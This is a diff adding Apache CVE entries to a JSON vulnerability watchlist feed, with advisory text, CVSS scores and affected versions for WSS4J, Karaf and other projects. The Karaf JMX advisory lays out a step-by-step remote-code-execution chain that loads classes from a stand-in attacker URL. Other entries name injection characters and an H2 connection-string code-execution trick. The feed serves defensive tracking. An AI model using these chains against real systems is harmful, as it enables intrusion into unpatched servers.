+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache wss4j",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.00488,
+      "nvd": {
+        "cvss_v3_score": 7.5,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-20"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
       "cve_id": "CVE-2026-86243",
       "description": "Buffer over-read vulnerability in Apache Tomcat Native during the TLS handshake permits a malicious user to trigger a DoS via a JVM crash.\n\n\n\nThis issue affects Apache Tomcat Native: from 2.0.0 through 2.0.15, from 1.3.0 through 1.3.8. Earlier, unsupported versions may also be affected.\n\n\n\nUsers are recommended to upgrade to version 1.3.9 or 2.0.16, which fix the issue.",
       "cvss_score": 7.5,
@@ -53205,6 +53970,61 @@
       }
     },
     {
+      "cve_id": "CVE-2026-87830",
+      "description": "In the StAX streaming WS-SecurityPolicy validator, certain relative or unsupported XPath expressions can be converted into paths that never match the actual XML element path. A remote SOAP peer may therefore send a required element without the expected signature or encryption.\nUsers are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4, which fix this issue.",
+      "cvss_score": 9.1,
+      "cvss_severity": "CRITICAL",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache wss4j",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "4.0.0",
+              "lessThan": "4.0.2",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "3.0.0",
+              "lessThan": "3.0.6",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "2.4.4",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache wss4j",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.00281,
+      "nvd": {
+        "cvss_v3_score": 9.1,
+        "cvss_v3_severity": "CRITICAL",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-917"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
       "cve_id": "CVE-2026-87976",
       "description": "Apache NiFi Registry 0.4.0 through 2.11.0 are subject to path manipulation when storing extension bundle content using group, artifact, and version coordinates from uploaded NAR manifests. The default file persistence provider used coordinates as filesystem path components without rejected parent-directory names, and the path-containment check compared an unnormalized resolved path. An authenticated user authorized to write and delete bundles in a bucket can upload a NAR with a crafted manifest resulting in file system operations outside of the file persistence directory. Upgrading to Apache NiFi Registry 2.12.0 is the recommended mitigation, which rejects parent-directory coordinates and requires a normalized path to remain a strict child of the storage root location.",
       "cvss_score": 7.2,
@@ -53248,6 +54068,218 @@
       }
     },
     {
+      "cve_id": "CVE-2026-88789",
+      "description": "Improper Restriction of XML External Entity Reference in the XSLT support extension (camel-quarkus-support-xalan) in Apache Camel Quarkus from 3.2.0 before 3.33.3 and from 3.34.0 before 3.40.0 on all platforms allows an attacker who supplies the XML document being transformed to read local files or issue requests to internal network locations via an external entity declaration in that document.\n\nThe extension supplies its own Xalan-backed TransformerFactory to the xslt component and registers it as the JAXP default. Xalan-J 2.7.x predates JAXP 1.5 and does not honour javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD or ACCESS_EXTERNAL_STYLESHEET, so the external access restrictions Apache Camel applies to the TransformerFactory it creates were not in effect. On the xslt component path this affects message bodies that reach the transformer already as a javax.xml.transform.Source; bodies of other types are converted to a SAXSource by Apache Camel with external entities and external DTD loading disabled, and are not affected. Because the factory is also the JAXP default, other code in the application obtaining one through TransformerFactory.newInstance() loses the same restrictions without error.\n\nApplications are affected if they use any of camel-quarkus-xslt, camel-quarkus-xslt-saxon, camel-quarkus-tika or camel-quarkus-xmlsecurity, each of which brings the XSLT support extension onto the classpath. For all but camel-quarkus-xslt, the exposure is limited to the JAXP default factory, since those extensions do not perform XSLT transformations themselves.\n\nUsers are recommended to upgrade to version 3.33.3 or 3.40.0, which fixes this issue.",
+      "cvss_score": 8.6,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache camel quarkus",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "3.2.0",
+              "lessThan": "3.33.3",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "3.34.0",
+              "lessThan": "3.40.0",
+              "versionType": "semver"
+            },
+            {
+              "status": "unaffected",
+              "version": "3.33.3",
+              "versionType": "semver"
+            },
+            {
+              "status": "unaffected",
+              "version": "3.40.0",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache camel quarkus",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 8.6,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-611"
+        ],
+        "cpe_count": 0,
+        "reference_count": 5
+      }
+    },
+    {
+      "cve_id": "CVE-2026-88920",
+      "description": "An authentication bypass in the DOM security processor in Apache WSS4J allows unauthenticated remote attackers to forge authenticated SOAP messages via a crafted unsigned SAML sender-vouches assertion containing an attacker-controlled key.\n\nUsers are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4, which fix this issue.",
+      "cvss_score": 9.8,
+      "cvss_severity": "CRITICAL",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache wss4j",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "4.0.0",
+              "lessThan": "4.0.2",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "3.0.0",
+              "lessThan": "3.0.6",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "2.4.4",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache wss4j",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.00839,
+      "nvd": {
+        "cvss_v3_score": 9.8,
+        "cvss_v3_severity": "CRITICAL",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-287"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-89238",
+      "description": "WSS4J EncryptedHeader child confusion could promote an attacker-controlled plaintext element as the decrypted header, leading to incorrect confidentiality coverage and possible policy bypass.\nUsers are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4, which fix this issue.",
+      "cvss_score": 9.1,
+      "cvss_severity": "CRITICAL",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache wss4j",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "4.0.0",
+              "lessThan": "4.0.2",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "3.0.0",
+              "lessThan": "3.0.6",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "2.4.4",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache wss4j",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.00233,
+      "nvd": {
+        "cvss_v3_score": 9.1,
+        "cvss_v3_severity": "CRITICAL",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-345"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-90979",
+      "description": "LDAPCache\u00a0and\u00a0LDAPBackingEngine\u00a0build LDAP search filters for user lookup and role lookup by textually substituting the placeholders\u00a0%u,\u00a0%dn, and\u00a0%fqdn\u00a0(drawn from the login name, the resolved user DN, and its fully qualified namespace form) into administrator-configured filter templates (userFilter,\u00a0roleFilter). Before the fix, the only sanitization applied to the substituted value was double backslashed:\n\nfilter = filter.replaceAll(Pattern.quote(\"%u\"), Matcher.quoteReplacement(user));\n\nfilter = filter.replace(\"\\\\\", \"\\\\\\\\\");\n\n\n\n\nThis does not escape the other characters RFC 4515 requires escaping in an LDAP search filter:\u00a0*,\u00a0(,\u00a0), and\u00a0NUL. A login name containing any of these can change the structure of the resulting filter rather than being matched as a literal value (e.g. a crafted username can turn an equality match into a wildcard match, or close/reopen filter clauses), widening what the search returns and potentially causing a login or role lookup to match an LDAP entry other than the intended one, over-granting roles, and depending on deployment-specific filter templates, potentially affecting which account a login resolved to.\n\n\n\n\nIt's not exploitable through every entry points:\u00a0LDAPLoginModule\u00a0and\u00a0LDAPPubkeyLoginModule\u00a0both called\u00a0Util.doRFC2254Encoding()\u00a0(correct RFC 4515 escaping) on the login name before handing it to\u00a0LDAPCache, which masked the missing escaping in\u00a0LDAPCache\u00a0for those two call paths. Using\u00a0LDAPCache\u00a0directly (bypassing the login modules) does not reproduce through the normal\u00a0LDAPLoginModule/LDAPPubkeyLoginModule\u00a0authentication flow for this reason. It does reproduce through two other call paths that reach\u00a0LDAPCache/LDAPBackingEngine\u00a0without any prior escaping:\n\n  *  GSSAPILdapLoginModule\u00a0passes the\u00a0NameCallback\u00a0name straight through, unescaped.\n  *  LDAPBackingEngine\u00a0(listRoles) passes\u00a0principal.getName()\u00a0straight through, unescaped.",
+      "cvss_score": 7.3,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache karaf",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "4.4.12",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache karaf",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.00274,
+      "nvd": {
+        "cvss_v3_score": 7.3,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-90"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
       "cve_id": "CVE-2026-91006",
       "description": "Apache Karaf's instance-management service (InstanceServiceImpl) builds the command line used to launch a child Karaf JVM by string concatenation, then executes it through\u00a0/bin/sh\u00a0(Unix) or\u00a0cscript\u00a0(Windows). The caller-supplied\u00a0javaOpts\u00a0value is spliced into that string unquoted. A javaOpts value containing shell metacharacters (;,\u00a0|,\u00a0`,\u00a0$(...)) is interpreted by the shell instead of being passed to the JVM as an option, giving arbitrary OS command execution as the Karaf process user.\n\n\nReachable via the shell commands\u00a0instance:create,\u00a0instance:start,\u00a0instance:restart,\u00a0instance:change-opts, and the equivalent\u00a0InstanceMBean\u00a0JMX operations (createInstance,\u00a0startInstance,\u00a0changeJavaOpts,\u00a0cloneInstance).\n\nMitigation\u00a0  *  Set\u00a0karaf.secured.command.compulsory.roles=admin\u00a0in\u00a0etc/system.properties\u00a0to close the fail-open gap for all unconfigured command scopes.\n  *  Restrict which principals can reach\u00a0instance:*\u00a0commands and\u00a0InstancesMBean\u00a0via\u00a0etc/users.properties\u00a0role assignments.\n  *  Treat\u00a0javaOpts\u00a0passed to instance:create/instance:start/instance:change-opts/InstancesMBean\u00a0as untrusted input only from fully-trusted operators.",
       "cvss_score": 8.8,
@@ -53285,6 +54317,92 @@
         "cvss_v2_severity": null,
         "cwe_ids": [
           "CWE-78"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-91012",
+      "description": "org.apache.karaf.config.core.impl.ConfigRepositoryImpl#update(pid, properties),\nwhich backs the \"config\" MBean and the config:* shell commands, derives the file\nit writes a configuration to from caller-supplied input without checking that\nthe result stays inside\u00a0${karaf.etc}:\n\n  *  if the submitted property map contains a\u00a0felix.fileinstall.filename\u00a0entry, that value is turned directly into a\u00a0File\u00a0(getCfgFileFromProperty), so it can point to any absolute path the Karaf process can write to;\n  *  otherwise the configuration PID is concatenated verbatim into the target file name (generateConfigFilename(): new File(karaf.etc, pid + \".cfg\")), so a PID containing \"..\" segments resolves outside\u00a0${karaf.etc}.\u00a0createFactoryConfiguration()\u00a0has the same issue via the factory PID/alias.\n\n\nBoth code paths are reachable by any caller holding the \"manager\" role under Karaf's shipped command/JMX ACL (org.apache.karaf.command.acl.conf.cfg:\u00a0\"update = manager\"). Such a user can therefore write attacker-controlled content to any file the Karaf process can write, including files the same ACL otherwise reserves to \"admin\" (etc/users.properties,\u00a0etc/*.acl.*.cfg,\u00a0etc/org.apache.karaf.management.cfg, and similar), allowing a manager-role user to grant themselves the admin role or otherwise take over the container.\n\n\n\n\n\n\nConfigMBeanImpl.install()\u00a0and the\u00a0config:install\u00a0shell command already guarded the equivalent risk on their own code path with a\u00a0finalname.contains(\"..\")\u00a0string check, but that check does not stop absolute paths or symlink-based escapes, and it was never applied to\u00a0ConfigRepositoryImpl.update()\u00a0/\u00a0createFactoryConfiguration()\u00a0at all.",
+      "cvss_score": 9.8,
+      "cvss_severity": "CRITICAL",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache karaf",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "4.4.12",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache karaf",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.00172,
+      "nvd": {
+        "cvss_v3_score": 9.8,
+        "cvss_v3_severity": "CRITICAL",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-22"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-91048",
+      "description": "The\u00a0jdbc\u00a0shell command scope shipped no\u00a0org.apache.karaf.command.acl.jdbc.cfg. Karaf's command guard (SecuredSessionFactoryImpl) treats a command with no matching ACL rule as allowed, so any authenticated shell session (including one holding only the\u00a0viewer\u00a0role) could run every\u00a0jdbc:*\u00a0command.\u00a0jdbc:ds-create\u00a0stores a fully attacker-controlled JDBC URL into a\u00a0pax-jdbc-config\u00a0factory\u00a0Configuration\u00a0with no validation.\u00a0pax-jdbc-config\u00a0reactively turns that into a live\u00a0DataSource. Several JDBC drivers run code or SQL at connection time based on URL parameters (e.g. H2\u00a0INIT=RUNSCRIPT), so a\u00a0viewer-level shell user could reach arbitrary code execution, bypassing the\u00a0admin-role gate that already protects\u00a0shell:exec. This is a privilege-escalation-to-RCE chain, not merely an \"admin misconfiguration\".\n\n\nThe same applies to\u00a0jms:*\u00a0shell commands.",
+      "cvss_score": 9.8,
+      "cvss_severity": "CRITICAL",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache karaf",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "4.4.12",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache karaf",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.00189,
+      "nvd": {
+        "cvss_v3_score": 9.8,
+        "cvss_v3_severity": "CRITICAL",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-862"
         ],
         "cpe_count": 0,
         "reference_count": 2
@@ -53459,6 +54577,104 @@
           "CWE-770"
         ],
         "cpe_count": 1,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-92121",
+      "description": "In the WSS4J streaming (StAX) code, a signature reference using the WS-Security STR-Transform leaves an internal \"inside signed content\" flag permanently set. The WS-SecurityPolicy enforcer uses that flag to decide whether an element needs checking, so it stops evaluating SignedParts and SignedElements for the rest of the message. A policy requiring the SOAP Body to be signed is then satisfied even when the Body carries no signature, removing the protection against XML Signature Wrapping. Signature verification itself is unaffected. The DOM code is not affected.\u00a0\nUsers are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4 which fix this issue.",
+      "cvss_score": 7.5,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache wss4j",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "4.0.0",
+              "lessThan": "4.0.2",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "3.0.0",
+              "lessThan": "3.0.6",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "2.4.4",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache wss4j",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.0038,
+      "nvd": {
+        "cvss_v3_score": 7.5,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-693"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-92142",
+      "description": "Apache Karaf exposes a JMX MBeanServer guarded by\u00a0KarafMBeanServerGuard, which enforces role-based access control (RBAC) on MBean operations invoked over the remote JMX connector (RMI registry/server, enabled by default on ports 1099 and 44444). The guard is implemented as a java.lang.reflect.Proxy\u00a0around the MBeanServer, and only forwards a fixed list of operation names to the RBAC check, defined in\u00a0MBeanInvocationHandler#guarded:\n\n\n\u00a0 private final List<String> guarded = Collections.unmodifiableList( Arrays.asList(\"invoke\", \"getAttribute\", \"getAttributes\", \"setAttribute\", \"setAttributes\"));\n\n\n\n\nThe MBean lifecycle operations\u00a0MBeanServer#createMBean,\u00a0#registerMBean\u00a0and\u00a0#unregisterMBean\u00a0are not in this list. Calls to these methods are forwarded directly to the underlying\u00a0MBeanServer\u00a0with no role check at all, regardless of the roles configured in\u00a0etc/jmx.acl.*.cfg.\n\n\n\n\nAs a result, any user who can authenticate to the JMX endpoint, including a user holding only the least-privileged \"viewer\" role, can call\u00a0createMBean()\u00a0to instantiate an arbitrary class as a MBean, and\u00a0unregisterMBean()\u00a0to remove it again afterwards, with no authorization check and no audit log entry (logging in\u00a0KarafMBeanServerGuard\u00a0only occurs on the RBAC-denial path, which this bypass never reaches).\n\n\n\n\nThis is significant because\u00a0javax.management.loading.MLet, a standard JDK MBean, can be instantiated this way.\u00a0MLet\u00a0acts as a remote classloader: its\u00a0getMBeansFromURL(URL)\u00a0operation fetches an\u00a0MLet\u00a0text file from an attacker-controlled URL and instantiates and registers the classes it lists as new MBeans in the target JVM. Reaching this operation still goes through\u00a0KarafMBeanServerGuard's existing \"invoke\" check, but the default\u00a0etc/jmx.acl.cfg\u00a0grants the \"viewer\" role to any method name matching the wildcard rule \"get* = viewer\", a heuristic intended for read-only getters. Because \"getMBeansFromURL\" happens to start with \"get\", it also matches that rule, so a default installation grants \"viewer\" callers permission to invoke it without any Karaf-specific ACL naming\u00a0MLet\u00a0at all. Combined with the createMBean gap, this gives a \"viewer\"-role JMX client a path to remote code execution to the Karaf JVM:\n\n  *  Authenticate to JMX as any user with any role (e.g. \"viewer\").\n  *  mbs.createMBean(\"javax.management.loading.MLet\", objectName)\u00a0is not in\u00a0GUARDED_OPERATIONS, no RBAC check, MLet is instantiated and registered.\n  *  mbs.invoke(objectName, \"getMBeansFromURL\", new Object[]{\"http://attacker/mlet.txt\"}, ...)\u00a0is guarded, but the method name matches the default \"get* = viewer\" ACL rule, so permitted.\n  *  The remote\u00a0.mlet\u00a0file is fetched and its listed classes are loaded and registered as new MBeans, running attacker-supplied code in the Karaf JVM.\n  *  mbs.unregisterMBean(objectName)\u00a0can be used to remove the MLet afterwards, also not in\u00a0GUARDED_OPERATIONS, no RBAC check, no audit trail.\n\n\nThe fix adds\u00a0createMBean,\u00a0registerMBean\u00a0and\u00a0unregisterMBean\u00a0to the guarded operation list, resolves required roles for them from the\u00a0jmx.acl*\u00a0configuration by\u00a0ObjectName\u00a0and (for\u00a0createMBean/registerMBean) MBean class name, and ships default\u00a0etc/jmx.acl.cfg\u00a0entries restricting all three operations to the \"admin\" role. This allows deployments to also write class-name-specific rule, e.g.:\n\n\n\n\ncreateMBean(java.lang.String)[/javax\\.management\\.loading\\..*/] = admin\n\n\n\n\nApache Karaf users should upgrade to 4.4.12 or 4.5.0 or later, once released, as soon as possible. Until an upgrade is available, restrict network access to the JMX RMI registry/server ports (1099/44444) to trusted hosts, or avoid issuing any non-\"admin\" JMX credentiels.",
+      "cvss_score": 8.8,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache karaf",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "4.4.12",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache karaf",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.00313,
+      "nvd": {
+        "cvss_v3_score": 8.8,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-862"
+        ],
+        "cpe_count": 0,
         "reference_count": 2
       }
     },
@@ -53722,6 +54938,49 @@
       }
     },
     {
+      "cve_id": "CVE-2026-93546",
+      "description": "Integer overflow in mod_dav_fs in Apache HTTP Server through 2.4.68 allows an authenticated WebDAV client with write access to crash worker processes and persistently corrupt a directory's property database via PROPPATCH requests declaring many XML namespaces.",
+      "cvss_score": 8.8,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 8.8,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-190"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
       "cve_id": "CVE-2026-93994",
       "description": "Apache MINA SSHD is a Java library for client-side and server-side SSH. SSH servers can be configured to require multi-authentication schemes, for instance two different public keys, not just one. In OpenSSH, this would be done by setting in sshd_config AuthenticationMethods \"publickey,publickey\". Apache MINA SSHD provides an equivalent configuration mechanism.\n\n\n\n\nIn Apache MINA SSHD versions up to 2.19.0 and 3.0.0-M1 to 3.0.0-M5 the server code in component sshd-core does not enforce that the two public keys presented are different. A user can thus successfully authenticate with only one of the two key pairs required by presenting this single key twice. This is a partial authentication bypass.\n\n\n\n\n\n\nUsers are recommended to upgrade to version 2.20.0 or 3.0.0-M6, which fix this issue.",
       "cvss_score": 8.1,
@@ -53757,7 +55016,18 @@
         "vendor:apache software foundation"
       ],
       "active_threat": false,
-      "probability_score": 0.00475
+      "probability_score": 0.00475,
+      "nvd": {
+        "cvss_v3_score": 8.1,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-304"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
     },
     {
       "cve_id": "CVE-2026-94002",
@@ -53795,7 +55065,18 @@
         "vendor:apache software foundation"
       ],
       "active_threat": false,
-      "probability_score": 0.00426
+      "probability_score": 0.00426,
+      "nvd": {
+        "cvss_v3_score": 7.5,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-770"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
     },
     {
       "cve_id": "CVE-2026-94052",
@@ -53833,7 +55114,18 @@
         "vendor:apache software foundation"
       ],
       "active_threat": false,
-      "probability_score": 0.00549
+      "probability_score": 0.00549,
+      "nvd": {
+        "cvss_v3_score": 9.1,
+        "cvss_v3_severity": "CRITICAL",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-304"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
     },
     {
       "cve_id": "CVE-2026-94053",
@@ -53871,7 +55163,19 @@
         "vendor:apache software foundation"
       ],
       "active_threat": false,
-      "probability_score": 0.00549
+      "probability_score": 0.00549,
+      "nvd": {
+        "cvss_v3_score": 9.1,
+        "cvss_v3_severity": "CRITICAL",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-90",
+          "CWE-305"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
     },
     {
       "cve_id": "CVE-2026-94243",
@@ -53911,6 +55215,49 @@
         "cvss_v2_severity": null,
         "cwe_ids": [
           "CWE-346"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-94250",
+      "description": "Allocation of resources without limits or throttling vulnerability in batch-requests plugin in Apache APISIX.\n\n\n\nAn unauthenticated caller can drive a gateway worker into OOM via a route where the batch-requests plugin is used and the\u00a0batch endpoint is publicly exposed. This issue affects Apache APISIX: from 1.3.0 through 3.18.0.\n\n\n\nUsers are recommended to upgrade to version 3.19.0, which fixes the issue.",
+      "cvss_score": 8.2,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache apisix",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "1.3.0",
+              "lessThanOrEqual": "3.18.0",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache apisix",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": null,
+        "cvss_v3_severity": null,
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-770"
         ],
         "cpe_count": 0,
         "reference_count": 2
@@ -53960,6 +55307,104 @@
         "cvss_v2_severity": null,
         "cwe_ids": [
           "CWE-502"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-95616",
+      "description": "An integer overflow in WSS4J's DER bounds check lets an oversized allocation pass validation. An unauthenticated attacker can send a SOAP message carrying an X.509 certificate whose SubjectKeyIdentifier extension declares a length of 0x7FFFFFFF; WSS4J decodes this while resolving the signature's key reference, before the message is authenticated, so an eleven-byte extension triggers a 2 GB allocation. Repeated requests exhaust server memory.\nUsers are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4, which fix this issue.",
+      "cvss_score": 7.5,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache wss4j",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "4.0.0",
+              "lessThan": "4.0.2",
